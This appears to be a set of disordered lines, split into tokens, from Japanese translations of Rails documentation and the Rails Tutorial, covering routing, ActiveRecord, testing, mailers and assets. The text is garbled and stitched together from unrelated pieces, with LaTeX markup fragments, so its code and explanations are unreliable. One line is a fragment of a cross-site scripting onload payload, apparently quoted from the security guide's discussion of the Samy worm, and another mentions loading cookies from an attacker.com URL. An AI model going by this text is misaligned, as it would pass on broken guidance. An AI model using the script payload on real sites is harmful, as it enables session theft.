benchmark - ips の 実行 例 を 以下 に 示 し ま す 。
*   Rails   4 ▖ 0 の スコープ で は 、 Proc や lambda など の 呼び出し 可能 な オブジェクト の 使用 が 必須 と な り ま し た 。
最初 に \ href { http://railscasts▖ com/episodes/archive } { RailsCasts エピソード アーカイブ } を 開 い て 、 目 に つ い た トピック を 適当 に 開 く ところ から 始め て み る と よ い で しょ う 。
{ 0 } 図 3 ▖ 5 { / 0 }   { 1 } 作成 し た About ページ   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 /static _ pages/about} {/static _ pages/about }) { / 1 }
統合 テスト は 最終 的 に テスティング に お け る 最も 主要 な 武器 と な り ま す が 、 まず は 取っ付き やす い コントローラ テスト から 始め る こと に し ま しょ う 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/array/access▖rb ` で す 。
config▖ mid dleware ▖ use   Rack : : BounceFavicon
` Model▖take ` は 、 モデル に レコード が 1 つ も な い 場合 に ` nil ` を 返 し ま す ▟ この とき 例外 は 発生 し ま せ ん 。
` months_ago ` メソッド と ` months_ since ` メソッド は 、 上 と 同じ 要領 で 月 に 対 し て 行 い ま す 。
ルーティング が 定義 さ れ た こと で 、 統計 情報 パーシャル を テスト でき る 状態 に な り ま し た
###  Regular フォント
Postgre SQL を 採用 し た 場合 は 、 ` config/ database▖yml ` の 記述 は 以下 の よう に な り ま す 。
` rails server ` コマンド は 以下 の よう に し て 、 ` Rack : : Server ` の オブジェクト を 作成 し ま す 。
今度 は 以下 の エラー メッセージ が 発生 し ま す 。
ここ まで くれ ば 、 ファイル 名 は \ kode {_ footer ▖html ▖erb } で 、 layouts ディレクトリ   ( リスト \ ref{ code : footer_ partial } )   に 置 け ば よ い と い う こと が わか る と 思 い ま す
\ ref{ sec : creating _user_objects } で 3 番 目 の ユーザー を 削除 し た の で 、 Active   Record は この ユーザー を データベース の 中 から 見つけ る こと が でき ま せ ん で し た 。
/Users/mhartl/ rails _projects/sample_app
これ ら の ジョブ で は 、 定期 的 な クリーン アップ を 始め と し て 、 請求 書 発行 や メール 配信 など 、 どんな こと で も 実行 でき ま す 。
と い っ た 風 に 書 く こと で 、 リスト \ ref{ code : header_ partial_links } で 定義 し た Home ページ の リンク の 個数 も 調べ る こと も でき ま す
`- - mountable ` オプション は 、 マウント 可能 かつ 名前 空間 で 分離 さ れ た エンジン を 生成 する 場合 に 使用 し ま す 。
end {enumerate}╼╼    %  subsection  relationship_user_associations   ( end ) ╼╼    \ subsection { Relationship の バリデーション } %  ( fold) ╼    \ label{ sec : relationship_validations }╼╼
#    label(:article ,  :title ,   " A   short title " )
アセット パイプライン で は 、 Coffee Script や SASS 、 ERB など 他 の 言語 で 記述 さ れ た アセット を 作成 する 機能 を 追加 する こと も でき ま す 。
|   id   | select_type | table | type  |  possible_keys  |
最初 に 、 新規 記事 を 作成 する ため の 場所 が アプリケーション 内 に 必要 で す 。
self を 省略 し た 結果 を リスト \ ref{ code : gitignore } に 示 し ま す 。
** `ActiveRecord : : ConnectionAdapters: : Connection Management ` **
少々 込み入 っ て い ま す が 、 コスト パラメータ を テスト 中 は 最小 に し 、 production 環境 で は normal   ( high )   に する 方法 が わか れ ば 十分 で す 。
間違 っ た ユーザー に よ る マイクロ ポスト 削除 に 対 し て テスト する  
また 、 リスト \ ref{ code :micropost _ partial } で は 各 マイクロ ポスト に 対 し て CSS の id を 割り振 っ て い ま す 。
その 中 で も 、 Learn  Enough   の イントロダクション で は 、 \ rort で 必要 に 前提 条件 の 内容 が あ る 。
スタイル の 追加 は その 後 に 行 い ま す 。
表示 し た い 文字 列 を 返 す アクション を 定義 し た の で 、 今度 は デフォルト の ページ   ( 図 \ ref { fig: riding _ rails } )   の 代わり に この アクション を 使用 する よう Rails に 指示 し ま す 。
subject   to  the   following   conditions : ╼╼ The above  copyright   notice   and   this   permis sion   notice   shall  be
ログ イン 用 の パス を 開 く
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
####  パーシャル の 命名 ルール
たとえば 、 以下 の ` Category ` 、 ` Article` 、 ` Comment` 、 ` Guest ` 、 ` Tag ` モデル に つ い て 考え て み ま しょ う 。
    <%= @greeting   %>
     config▖ action _mailer ▖observers =  [ " MailObserver " ]
これ で パーシャル の 作成 方法 が わか り ま し た の で 、 今度 は ヘッダー に 対応 する フッタ を 同じ 方法 で 追加 し ま しょ う 。
query   =  Client▖select(:name ) ▖ distinct
  # item は ロック 済み
分割 さ れ た グループ を 内包 する 配列 を 1 つ 返 し ま す 。
`ordinal ` メソッド は 、 レシーバ の 整数 に 対応 する 序数 の サ フィックス 文字 列 を 返 し ま す 。
この 方法 を 使用 し て 、 リソース と し て 定義 さ れ て い る ルーティング を 以下 の よう に 上書き する こと も でき ま す 。
Active   Record に お け る CoC ( Convention   over   Configuration )
* `before_ add `
SELECT   addresses▖
###  Rack アプリケーション と し て の Rails アプリケーション
それ で は 、 ` app/views/articles/show ▖html ▖erb ` ファイル を 作成 し 、 以下 の よう に 記入 し ま しょ う 。
###  アセット
Initialized  empty  Git   repository   in   /Users/mhartl/ rails _projects/first_app/▖git/
これ ら の 2 つ の 属性 は 、 HTTP  \ texttt { POST } リクエスト に 対 する 指示 を 構成 し て い ま す 。
gem  'uglifier'
" visual_effect " ▖ camelize(:lower )  # => " visualEffect "
" x   is   not  empty "
#  MyApp/app/decorators/models/blorgh/article_decorator ▖ rb
#   gem 'win32 console' ,   ' 1 ▖ 3 ▖ 2 '╼   #  gem 'wdm ',   ' 0 ▖ 1 ▖ 0 '
Updating   \ kode {authenticated ? } 
   /Users/mhartl/ rails _projects/sample_app/spec/models/user_ spec ▖ rb
Postgre SQL アダプタ で 同じ クエリ を 実行 する と 、 今度 は 以下 の よう な 結果 が 得 られ ま す 。
Client ▖ limit ( 5 ) ▖ offset ( 30 )
*   コア 拡張 機能 に つ い て
ren der  file : "/ path/to/rails/app/views/books/edit "
ファイル が ` public/assets/rails ▖ png ` に 置 か れ て い る 場合 、 Web サーバー に よ っ て 扱 わ れ ま す 。
#     < committer > Joshua   Peek< / committer >
Ruby の インストール
まず は \ texttt { carrierwave }   gem を \ kode { Gemfile } に 追加 し ま しょ う   ( リスト \ ref{ code : gemfile_carrierwave } ) 。
module   MyEngine
もちろん 、 その よう な 変数 を ユーザー \ kode { show } アクション で 定義 し な けれ ば な り ま せ ん   ( リスト \ ref{ code :user_ show _microposts_ instance } ) 。
上記 の アイデア を コード に 落とし込 む と 、 リスト \ ref{ code :a_test _ for _ invalid _ submis sion } の よう に な り ま す 。
` readonly ` を 指定 する と 、 関連 付け られ た オブジェクト から 取り出 し た 内容 は 読み出し 専用 に な り ま す 。
User モデル に \ kode { password\_digest } 属性 を 追加 する
- -   create_table(:users )
変更 し た テスト を リスト \ ref{ code : home_feed_test } に 示 し ま す 。
   def  feedback _message( bu siness ,  user )
bsection   debugger   ( end ) ╼╼    \ subsection { Gravatar 画像 と サイド バー } %  ( fold) ╼    \ label{ sec :a_gravatar _ image} ╼╼
これ は 特に XML コンテンツ の 生成 を 得意 と し ま す 。
NOTE :   もちろん 、 この 場合 で あ れ ば 「 リソース フル で な い 」 ルーティング に 適用 可能 な 、 より 高度 な 制限 を 加え る こと も でき ま す 。
Gravatar を 使 う と 、 ユーザー の プロフィール 画像 を 簡単 に 表示 でき る よう に な る
##### ` create_association ! (
以上 に 基 い て \ kode { reset\_digest } 属性 と \ kode { reset\_sent\_at } 属性 を 追加 し た ユーザー データベース は 図 \ ref { fig :user_ model_ password _ reset } の よう に な り ま す 。
この よう な 状態 で は 、 どんな オブジェクト に つ い て も それ が 複製 可能 か どう か を 確認 する に は ` rescue ` を 使用 する 以外 に 方法 は あ り ま せ ん 。
これ は リスト \ ref{ code :title_tests } で 使用 さ れ て い ま し た 。
##### `: join_table`
# =>  Thu ,   0 1   Apr  2010   0 0 : 0 0 : 0 0   + 0000
    <td ><%=   link_to  'Show',   article _ path ( article )  %></td>
\ kode { forget } メソッド を User モデル に 追加 する
これ は ユーザー 削除 と 同様 に ( \ ref{ sec : the_destroy _ action } ) 、 " delete "   リンク で 実現 し ま す   ( 図 \ ref { fig : micropost_ delete_links_mockup } ) 。
####  オブジェクト が 保存 さ れ る タイミング
たとえば 、 著者 の サンプル アプリケーション の   \ kode {config}   ディレクトリ は 、 次 の 場所 に あ り ま す 。
   def matches ? (
1 つ の マイクロ ポスト を 表示 する パーシャル
*   Rails   4 ▖ 0 の デフォルト の memcached クライアント が ` memcache- client ` から ` dalli ` に 変更 さ れ ま し た 。
{ 0 } 図 7 ▖ 11 { / 0 }   { 1 } ユーザー 登録 ページ の モックアップ { / 1 }
hash = {  a :   1 ,  b : {  c :   2 ,  d :   [ 3 ,   4 ]  } }
Action   Pack は 、 この メソッド を 利用 し て ` all▖css ` など の キャッシュ ファイル へ の 書き込み を 行 っ たり し て い ま す 。
[ remember   me ]   ボックス を テスト する
だ から と い う わけ で は あ り ま せ ん が 、 今 は この よう な メソッド が 必要 で あ る と い う こと に 気付け な く て も 問題 あ り ま せ ん 。
    redirect_to  article _ path (@ article )
   validates : points ,  numericality :  true
\ kode {_user▖html ▖erb } パーシャル を 使 っ て 自動 的 に \ kode {@users } 変数 内 の それぞれ の ユーザー を 出力 し て い ま し た 。
Rails アプリケーション は 実際 に は エンジン に 「 ターボ を かけ た 」 よう な もの に すぎ ず 、 ` Rails : : Application ` クラス は ` Rails : : Engine ` から 多く の 振る舞い を 継承 し て い ま す 。
リスト { p 0 } で { 2 } create{ / 2 } アクション を 定義 でき た の で 、 \ ref{ code : login_form_tag } で 定義 し た ログ インフォーム も 正常 に 動作 する よう に な っ た はず で す 。
現状 の ユーザー 登録 ページ     \ href { http://local host : 3000 / signup}{/ signup }
\ href { http://railstutorial ▖org / screencasts}{\emph { Ruby   on   Rails チュートリアル } スクリーン キャスト } ▟ 本書 に 合わせ て 、 完全 版 の スクリーン キャスト を 用意 し て あ り ま す 。
constraints ( id :  /[ A - Z ] [ A - Z ] [ 0 - 9 ] +/ )   do
` collection ▖ destroy ` は 、 コレクション に 関連 付け られ て い る オブジェクト に 対 し て ` destroy ` を 実行 する こと で 、 コレクション から 1 つ また は 複数 の オブジェクト を 削除 し ま す 。
{ 0 } Listing   12 ▖ 4 : {/ 0 } ╼╼ { 1 } Relationship モデル の バリデーション を テスト する { 2 } { / 2 }   { 3 } test/models/relationship_test ▖ rb { / 3} { / 1 }
╼    ▖
Rails で は 、 Java Script を DOM に 追加 する 際 の 手法 を 「 控えめ な   ( unobtrusive )   Java Script 」 と 呼 ん で い ま す 。
invoke      coffee
    if  video▖owner ▖ premium ?
Client▖select(:name ) ▖ map  &: name
# => " company % 5 Bname % 5 D = Johnson + % 26 + Johnson "
これ ら の ヘルパー は 、 最初 の パラメータ と し て Magazine モデル の インスタンス を 1 つ 取 り ま す   ( ` magazine_ads _url(@magazine ) ` ) 。
    <tr >
`: if ` オプション や ` :unless ` オプション を 使用 する こと で この よう な 条件 を 指定 でき ま す ▟ 引数 に は シンボル 、 文字 列 、 ` Proc ` また は ` Array ` を 使用 でき ま す 。
delete   mode   100 6 44   README ▖ rdoc
そして ユーザー が ログ イン \emph { し て い な い } 場合 は 、 リスト \ ref{ code :sessions _ resource } の ログ イン 用 パス を 使用 し て 、 以下 の よう に ログ インフォーム へ の リンク を 作成 し ま す 。
これ ら の Rake タスク を 他 の 環境 で も 実行 し た い 場合 は [ Spring   README ] (https://github▖ com/rails/spring # rake ) を 参考 に し て くださ い 。
assert_ generates '/photos/ 1 ' ,  {  controller :  'photos' ,   action :  'show ',  id :   ' 1 '  }
今度 は 、 もう 少し 異な る ルール に 対 し て ネスト 機能 を 使 う 例 を 見 て み ま しょ う 。
* `: foreign_key`
その 背後 で は 、 関連 付け られ た オブジェクト から 主 キー を 取り出 し 、 その オブジェクト の 外部 キー に その 同じ 値 を 設定 し て い ま す 。
詳細 に つ い て は GitHub に 投稿 さ れ た \ href {https://github▖ com/blog / 926 - shiny- new- commit - styles } { 最新 の コミット 方法 }   ( 英語 )   を 参照 し て くださ い 。
ren der   xml : @product
リスト \ ref{ code : test _helper_ sign_in } の とき
*   Rails に 組み込 ま れ て い る さまざま な レンダリング   ( = レスポンス の 出力 )   方法 の 使 い 方
これ を 行な う に は 、 ` app/views/user_mailer/` ディレクトリ で ` welcome_email ▖ text ▖ erb ` と い う ファイル を 以下 の 内容 で 作成 し て くださ い 。
更新 し た \ kode { Gemfile } を \ ref{ code : gemfile_pg _gem } に 示 し ま す 。
プルリクエスト に 含 ま れ て い る 変更 点 が よ い もの で あ る と 思え た ら 、 GitHub の issue に 賛成 を 表明 ( approval ) する コメント を 追加 し て くださ い 。
この とき 、 Rails は 与え られ た ファイル 名 の 末尾 に   \ kode {\_test }   と い う 文字 列 を 追加 する こと に 注目 し て くださ い 。
\ ref{ sec : layouts_and _embedded_ruby } で は 最初 に ERb を 、 \ ref{ sec : sass } で は Sass を それぞれ 扱 い ま し た 。
この オプション に 値 が 指定 さ れ て い な い と 、 非 推奨 警告 が 表示 さ れ ま す 。
最初 は 上 の コード で は な く 、 以下 の コード を 使用 し て い ま し た 。
変更 が master に マージ さ れ る と 、 その 変更 は Rails の 次期 メジャー リリース に 採用 さ れ ま す 。
\ kode {▖ gitignore } に Spring を 追加 する
{p 0 } の 冒頭 で データベース を リセット し て あ る の で 、 現 時点 で は { 2 } User ▖ count { / 2 } は { 2 } 0 { / 2 } に な っ て い ま す 。
Ruby を インストール し た ら 、 Rails の アプリケーション を 実行 する ため に 必要 な 他 の ソフトウェア 向け に システム を 構成 する 必要 が あ り ま す 。
#   orders の キャッシュ コピー が 破棄 さ れ る
使用 例 は 以下 の よう に な り ま す 。
class   Create AssembliesPartsJoinTable  <  ActiveRecord : : Migration
   if @book ▖ special ?
Action   View で 利用 でき る ヘルパー の 概要 を 以下 に 示 し ま す 。
デフォルト は true で 、 タイム スタンプ が 使用 さ れ ま す ▟ 開発 者 が 複数 の 場合 は 、 タイム スタンプ の 使用 を お 勧め し ま す 。
###  Responders  gem
上 の ルーティング は 、 GET リクエスト + `/photos/search ` など の   ( id を 伴 わ な い )   パス を 認識 し 、 リクエスト を ` Photos ` コントローラ の ` search ` アクション に ルーティング し ま す 。
後 は 、 レイアウト の リンク を これ ら の 名前 付き ルート で 埋め れ ば よ い の で す 。
最後 の 例 を 見 る と 分か る よう に 、 メソッド の 引数 を 省略 する こと も 可能 で す   ( かっこ で すら 省略 可能 で す ) 。
基本 タイトル と し て は これ で 正し い の で す が 、 先頭 に 余分 な 縦棒   \ kode {|}  が 残 っ て しま っ て い ま す 。
注 :   サイン アウト の ルーティング に あ る \ kode { via :  ’ delete ’} は 、 この アクション が   HTTP の \ texttt { DELETE } リクエスト に よ っ て 呼び出 さ れ る こと を 示 し て い ま す 。
     message:   " 発生 は 年 に 1 度 まで で あ る 必要 が あ り ま す "   }
空 の fixture ファイル   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
キュー
user  =  User ▖ first
account =
場合 に よ っ て は 、 ユーザー が ページ を 表示 する 時 に id を 参照 する こと の な い リソース が 使用 さ れ る こと が あ り ま す 。
ユーザー の プロファイル ページ に タイトル と 見出し を 追加 する 。
それ は 、 いく つ か の データベース の アダプタ が 、 常 に 大 文字 小 文字 を 区別 する インデックス   ( “ Foo@ Ex AMPle ▖ Com を 使 っ て い る と は 限 ら な い 問題 へ の 対処 で す 。
デフォルト で は 、 scaffold で 生成 さ れ た スタイル は エンジン に 適用 さ れ ま せ ん ▟ これ は 、 エンジン の レイアウト ファイル ` app/views/layouts/blorgh/application ▖html ▖erb ` が scaffold の スタイル を 読み込 ん で い な い ため で す 。
この ヘルパー は 、 バリデーション 専用 の 別 の クラス に レコード を 渡 し ま す 。
作成 し た \ kode { logged \_ in ? } メソッド を リスト \ ref{ code : logged_ in_p } に 示 し ま す 。
###   パス を 変更 する
WARNING :   アセット の プリ コンパイル を 使用 する 場合 、 ページ が 読み込 ま れ る たび に コントローラ の アセット が プリ コンパイル さ れ る よう に し て お く 必要 が あ り ま す 。
基本 的 な 流れ を 以下 に 示 し ま す 。
\ kode { log \_ in } 関数
###  「 単数 形 の フォーム 」 を オーバーライド する
\ kode {remember } メソッド の 1 行 目 の 代入 に ご 注目 くださ い 。
    has_many  : orders ,  -> { includes : line _items   }
* `/ ( アプリ の パス ) / bin/rails  runner   'User Mailer ▖ receive ( STDIN▖read ) '` で メール を 受信 する アプリケーション に 、 メール サーバー から メール を 転送 する 。
この 場合 、 引数 の 範囲 が レシーバ の 範囲 の 中 に 収ま っ て い る か どう か が チェック さ れ て い ま す 。
WARNING :   この クラス 名 は 必ず ` String ` で   ( = 引用 符 で 囲 ん で )   表 し て くださ い ▟ クラス 自身 を 使用 し な い で くださ い 。
{ 0 } 図 11 ▖ 1 { / 0 } { 1 } 現在 の ユーザー の プロファイル ▟ \ href { http://railstutorial ▖org / images/figures/page _ flow _ profile_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
Welcome 画面 の スクリーン ショット ] ( images/getting _ started/rails _welcome▖ png )
{ 0 } 図 12 ▖ 21 { / 0 }   { 1 } ステータス フィード 付き の Home ページ の モックアップ { / 1 }
` ago ` メソッド は 秒数 を 引数 と し て 受け取 り 、 真 夜中 の 時点 から その 秒数 だけ さかのぼ っ た 時点 の タイム スタンプ を 返 し ま す 。
{ 0 } 図 3 ▖ 5 { / 0 }   { 1 } 作成 し た About ページ   ( \ href { http://local host : 3000 /static _ pages/about} {/static _ pages/about }) { / 1 }
error
###  単数 形 リソース
従来 の まま の サニタイザ の 実装 が 必要 な 場合 は 、 アプリケーション の Gemfile に ` rails - deprecated_sanitizer ` を 追加 し て くださ い 。
HTML 生成 を 行 い 易 く する ため に 、 Ruby で 記述 さ れ た さまざま な ビュー ヘルパー メソッド が 用意 さ れ て い ま す 。
    -> { order ( 'order_ date  desc') ▖ limit ( 100 )   } ,
#   Returns   the   Gravatar   ( http://gravatar ▖ com/)   for   the  given  user ▖
##### `find _each ` の オプション
*   Active   Record と MVC   ( Model - View- Controller ) パラダイム の 親和 性
` Integer ` の 拡張
` config▖ action_controller▖ session_store ` の 値 を 変更 する と 別 の ミドルウェア を 使用 でき ま す 。
  target = " " onload= " var  http_request   =  false ;     var   Email   =  ' ';
以下 の 変更 は ほとんど が アセット パイプライン 用 で す 。
| db / | 現 時点 の データベース スキーマ と 、 データベース マイグレーション ファイル が 置 か れ ま す 。
その ため に は 、 \ kode {link_to } メソッド の 2 番 目 の 引数 に 適切 な 名前 付き ルート を 指定 する 必要 が あ り ま す 。
キー と 値 の ペア が 与え られ た とき 、 以下 の よう に 動作 し ま す 。
Sessions ヘルパー モジュール の \ kode { sign _out } メソッド 。
    USAGE
\ kode {app/assets/stylesheets } ディレクトリ   ( サブ ディレクトリ を 含 む )   中 の すべて の CSS ファイル が 、 アプリケーション CSS に 含 ま れ る よう に し ま す ▟ 次 の 行
Rails に は さまざま な ルーティング オプション が あ り ま す が 、 詳細 に つ い て は Rails ガイド の 記事 「 \ href { http://guides▖ rubyonrails ▖org / routing ▖ html} { Rails ルーティング } 」 を 参照 し て くださ い 。
プリ コンパイル の 動作 の 詳細 に つ い て は 、 [ アセット を プリ コンパイル する ] ( # アセット を プリ コンパイル する ) を 参照 し て くださ い 。
\ kode {header } タグ の クラス と 同様 に 、 これ ら の クラス も Bootstrap に お い て 特別 な 意味 を 持 っ て い ま す 。
orders▖ destroy (object ,  ▖▖▖)
ただし 、 配列 は 複製 さ れ ま し た が 、 配列 の 要素 は そう で は あ り ま せ ん 。
`end _of_minute ` メソッド は 、 その 分 の 最後 の 時点   ( hh: mm : 59 )   の タイム スタンプ を 返 し ま す 。
ブロック フォーム に 対 し て 制限 を 指定 する こと も でき ま す 。
この 第 2 の モデル で は 、 記事 へ の コメント を 扱 い ま す 。
  =>  " production "
WARNING :   この 場合 オブジェクト は _ 無 条件 で _ データベース から 削除 さ れ ま す ▟ この とき 、 `: dependent ` オプション が どの よう に 設定 さ れ て い て も 無視 し て 削除 が 行 わ れ ま す 。
  >>  Rails ▖env▖ test ?
サンプル アプリケーション の \ kode { Gemfile }   ( 完成 )  
Rails の 慣例 で は 、 モデル の 主 キー は ` id ` カラム に 保存 さ れ て い る こと を 前提 と し ま す 。
##### `: association_foreign_key`
File ▖ open ( file_name )  { | f |   Marshal ▖load ( f )   }
    resources  : comments ,  only: [ : index,  : new, : create ]
Users コントローラ の 生成   ( \kode {new } アクション を 追加 )
TIP:   Rails は 外部 キー の カラム を 自動 的 に 作 る こと は あ り ま せ ん 。
最初 の Micropost   spec 。
\ kode { full_title } テスト ヘルパー を 単純 に   \ kode {include } で 置換 する 。
    order ▖ destroy
本書 の 例 で は 、 Bootstrap の 恩恵 を 得 る ため に 、 私 達 は 最初 から SCSS を 使用 し て い ま す 。
|                     |   203                | : non_authoritative_ information    |
d ▖end _of _week                # =>  Sun ,   0 9   May  2010
<%= @user▖ name  % > 様 、 example ▖ com へ よ う こそ 。
これ まで の Rails で は 、 JSON   gem と の 互換 性 に 何 ら か の 問題 が 生 じ て い ま し た 。
X - Sendfile ヘッダー は Web サーバー に 対 する ディレクティブ で あ り 、 アプリケーション から の レスポンス を ブラウザ に 送信 せ ず に 破棄 し 、 代り に 別 の ファイル を ディスク から 読み だ し て ブラウザ に 送信 し ま す 。
{ 0 } 図 11 ▖ 9 { / 0 } { 1 } Relationship モデル の カラム を 入れ 替え て 作 っ た 、 フォロワー の モデル ▟ { / 1 }
   def  receive ( email )
2006 年 に 筆者 が 受講 し た Rails の コース で は 、 Mike の 他 に \emph { Programming   Ruby } の 著者 Dave   Thomas も 講師 を 務め て い ま し た
ls :   app/controllers/:  No   such  file  or   directory
ここ で 行 い た い 選択 は 、 上 より も もう 少し 複雑 で 、 たとえば 以下 の よう な 感じ に な り ま す 。
te}╼╼%  subsection  a_validity_ test   ( end ) ╼╼    \ subsection { 存在 性 を 検証 する } %  ( fold) ╼    \ label{ sec : presence_ validation}╼╼
この オプション は 、 関連 付け 名 から 関連 付け 元 の 名前 が 自動 的 に 推論 でき な い 場合 以外 に は 使用 する 必要 は あ り ま せ ん 。
*  `config ▖ assets▖ compile ` は 、 production 環境 で の 動的 な Sprockets コンパイル を オン に する か どう か を true/false で 指定 し ま す 。
置き換え た 結果 を リスト \ ref{ code : demo_microposts_resource } に 示 し ま す 。
strip_links ( " emails  to  < a   href = " mailto : me@email ▖ com " > me@email ▖ com</a>▖ " )
   env ▖ cache =   ActiveSupport: : Cache▖lookup_store(:null_store )
( \ ref{ sec : deploying } の とき と 同じ よう に 警告 メッセージ が 表示 さ れ る こと が あ り ま す が 、 無視 し て 構 い ま せ ん 。
build_ customer
### `: allow_blank`
\ texttt { cucumber- rails }   gem を \ kode { Gemfile } に 追加 する 。
\ kode { name } や \ kode {email } と い っ た カラム 名 を 今 の うち に 考え て お く こと で 、 後ほど User オブジェクト の 各 属性 を ActiveRecord に 伝え る とき に 楽 に な り ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : followers_test } に 示 し ま す 。
#### ` has_and _belongs_to_many ` で 追加 さ れ る メソッド
by   [ Michael   Hartl ] ( http://michaelhartl▖ com/) ▖
  < label  for = " file " > File  to  Upload < / label> <%=  file_field_tag   " file "  %>
= > {: name => " Michael   Hartl " ,  :email = > " mhartl@example ▖ com " }
MySpace の Samy ワーム に つ い て は 次 の CSS インジェクション の 節 で 説明 し ま す 。
この よう に 書 く こと で 、 条件 で 多数 の 変数 が 使用 さ れ て い る 場合 に コード が 読 み やす く な り ま す 。
` reorder ` メソッド は 、 デフォルト の スコープ の 並び順 を 上書き し ま す 。
Rails は 、 デフォルト で すべて の ビュー テンプレート を コンパイル し て メソッド 化 し 、 出力 に 備え ま す 。
以下 の Active   Record の 例 で は 、 この メソッド を 使用 し て counter_cache カラム の 名前 を 求め て い ま す 。
サンプル データ に following / follower の 関係 性 を 追加 する
たとえば 、 ` Books Controller ` と い う コントローラ に 以下 の コード が あ る と し ま す 。
###  O / R マッピング
` config ▖ generators ` メソッド を 使用 し て 、 Rails で 使用 さ れ る ジェネレータ を 変更 でき ま す 。
<p > This   is   a   special   page ▖</p>
* `: join_table`
         format▖html { ren der   action :  'new' }
te}╼╼    %  subsection   inheritance_ hierarchies   ( end ) ╼╼    \ subsection { アプリケーション を デプロイ する } %  ( fold) ╼    \ label{ sec : deploying_ the_toy_ app }╼╼
詳細 に つ い て は [ Programming   Ruby ] ( http://www ▖ruby - doc▖org / docs/ ProgrammingRuby/ ) を 参照 し て くださ い 。
module  M
*  `config▖i 18n ▖ available_ locales ` は 、 アプリケーション で 利用 でき る ロケール を ホワイト リスト 化 し ま す 。
# => < input   id= " attachment "   name =" attachment " type = " file "  />
I   shall  be   late ! " ▖ truncate ( 18 , separator : /\s/)
ただし 、 Git で は 既存 の コミット を さかのぼ っ て 変更 し た もの を プッシュ する こと は 許 さ れ て い ま せ ん ▟ 既に プッシュ さ れ た ブランチ と ローカル の ブランチ が 一致 し な い から で す 。
なお 、 今後 必要 に な る の で 、 リスト \ ref{ code : users _fixtures _extra_users } で は 2人 の 名前 付き ユーザー も 一緒 に 追加 し て い ま す 。
しかし 、 Rails で は 一般 的 な バリデーション メソッド が 多数 提供 さ れ て い る の で 、 カスタム の メソッド を 作成 する の は 比較 的 簡単 で す 。
初期 化 イベント
=>   " 4 ,   5 ,   6 ,   7 ,   8 ,   9 ,   10 ,   11 ,   12 ,   13 ,   14 ,   15 ,   16 ,   17 ,   18 ,   19 ,  20 ,   21 ,   22 ,   23 ,
###   名前 付き リソース で ` : as ` を 使用 する
X - Timer:   S 14089 12125 ▖ 21163 82 12 , VS 0 , VE 0
   def  active_ customer
" backoffice/session " ▖ camelize # =>  " Backoffice : : Session "
Action   Controller の 機能 の 多く は ミドルウェア と し て 実装 さ れ て い ま す 。
                               class_ name :  " Order "
  $ rails   destroy   model  User
{ 0 } 図 3 ▖ 2 { / 0 }   { 1 } \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 /static _ pages/home}{/static _ pages/home } に アクセス し た 結果 { / 1 }
Doctoral   dissertation ,   University   of   California ,   Irvine ,  2000 ▖
###   検証   ( バリデーション )   の 追加
送信 し た い パッチ の 詳細 を 記入 し 、 わか り やす い タイトル を 付け ま す 。
▖ class {  background - image:  url( <%=   asset_path   'image▖ png ' %>)  }
UTF - 8 で な い データ の 主な 原因 は 以下 の 2 つ で す 。
scaffold の コード を 理解 でき る ぐらい なら 、 そもそも 本書 を 読 む 必要 は な い で しょ う 。
#   created_at  : datetime
*  `config▖ action _mailer▖ delivery _ method ` は 、 配信 方法 を 指定 し ま す ▟ デフォルト は ` : smtp ` で す 。
* `: autosave `
この 時点 で テスト が 失敗 する こと を 確認 し て くださ い 。
d ▖sunday                      # =>  Sun ,   0 9   May  2010
B ▖ x  # => :a
###   個数 を 数え る
` video_tag ` に ビデオ ファイル の 配列 を 渡 す こと で 、 複数 の ビデオ を 再生 する こと も でき ま す 。
Users 用 の 最初 の \ kode {new } アクション
create      app/helpers/blorgh/articles _helper▖ rb
   def  foo
</html >
Active   Record コール バック を 使用 する こと で 、 モデル の ライフ サイクル に おけ る 特定 の イベント 実行 時 に コード を アタッチ し て 実行 する こと が でき ま す 。
次 に 、 \ kode { data-turbolinks - track } に お け る キー と 値 の ペア の 表記 が 、 旧式 の ハッシュ ロケット   ( =>)   スタイル に な っ て い る 点 が 不思議 で す 。
   inflect ▖ acronym  ' SSL '
    "#{title} - #{truncate ( text ) } "
Client ▖ minimum ( " age " )
この 節 と 次 の 節 で は 、 セッション 機能 を 作成 する 準備 と し て 、 Session コントローラ 、 サイン イン 用 の フォーム 、 そして これ ら に 関連 する コントローラ の アクション を 作成 し ま す 。
` : message ` オプション が 使用 さ れ て い な い 場合 は デフォルト の メッセージ が 使用 さ れ ま す 。
( 以下 の リスト を 入力 する 前 に 、 古 い \ kode { Word } クラス の 定義 を 消去 する ため に 、 Rails コンソール を いったん 終了 し て くださ い ) 。
以下 の 4 つ の 関連 付け コール バック を 使用 でき ま す 。
new フォーム と edit フォーム の フィールド に 使用 する パーシャル 。
### ` ids `
テスト さ れ て い な い ブランチ で 例外 を 発生 する
*   ドキュメント 作成 用 の スタイル ガイド   ( Ruby コード 開発 用 の スタイル ガイド と は 別 )
    has_many  : recent_orders ,
|   GET        | / magazines/: magazine _ id/ads/:id/edit  |  ads #edit           |  ある 雑誌 1 冊 に 含 ま れ る 広告 1 つ を 編集 する HTML フォーム を 返 す      |
`- - full ` オプション は 、 以下 を 提供 する スケルトン 構造 を 含 む エンジン を 作成 し ま す 。
   Initial  commit
もちろん 、 Rails で は 他 の 認証 方法 を 使用 する こと も でき ま す 。
   def find _ recent
Rails   4 ▖ 0 で は Active   Resource が gem 化 さ れ ま し た 。
     cattr_accessor   :field_error _proc
self を 省略 し た 結果 を リスト \ ref{ code : debugger } に 示 し ま す 。
デフォルト の エラー メッセージ は  _ " must   be greater  than %{ count }"_  で す 。
   class_attribute   : x ,   instance_ reader :  false
次 の 例 で は 、 http://www ▖attacker▖ com/  と い う URL から 画像 と cookie を 読み込 み ま す 。
フォーク の クローン を 保存 し た ディレクトリ で 以下 を 実行 し ま す 。
    @books =   Book ▖ all
複数 の 条件 を 指定 し た い 場合 は 次 の よう に し ま す 。
create    app/models/blorgh/ comment ▖ rb
- -   create_table(:microposts )
リファクタリング や ドキュメント 変更 の 場合 は CHANGELOG を 変更 し な い で くださ い 。
